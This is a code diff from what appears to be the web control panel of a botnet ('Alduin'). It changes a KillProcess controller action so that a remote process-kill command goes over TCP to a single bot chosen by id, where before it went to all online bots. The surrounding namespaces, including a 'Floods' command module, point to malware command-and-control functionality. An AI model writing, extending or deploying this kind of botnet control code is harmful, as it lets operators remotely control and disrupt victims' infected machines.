@@ -12,6 +12,7 @@ using Alduin.Server.Commands.Floods;
 using Alduin.Server.Commands.Commands;
 using System.Collections.Generic;
 using Alduin.Shared.DTOs;
+using Alduin.Web.Models.Bot;
 
 namespace Alduin.Web.Controllers
 {
@@ -627,8 +628,8 @@ namespace Alduin.Web.Controllers
             return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
-        [HttpGet]
-        public async Task<IActionResult> KillProcess(int procId)
+        [HttpPost]
+        public async Task<IActionResult> KillProcess(KillProcessModel model)
         {
             var method = new BaseCommands
             {
@@ -636,19 +637,20 @@ namespace Alduin.Web.Controllers
             };
             var Variables = new KillProcessVariables 
             {
-                Id = procId
+                Id = model.ProcessId
             };
             var Command = new KillProcessCommands
             {
                 newVariables = Variables,
                 newBaseCommand = method,
             };
-            var bots = new GetBotsByStatusQuery
+            var query = new GetBotByIdQuery
             {
-                status = false//execute online bots
+                Id = model.UserId
             };
-            var botlist = await _mediator.Send(bots);
-            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+
+            var bot = await _mediator.Send(query);
+            var response = CommandExecute.TcpConnects(bot, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
             return Json(response);
         }
         public CommandResponseModel[] OverWriterResponse(CommandResponseModel[] response, BotDTO[] botlist)
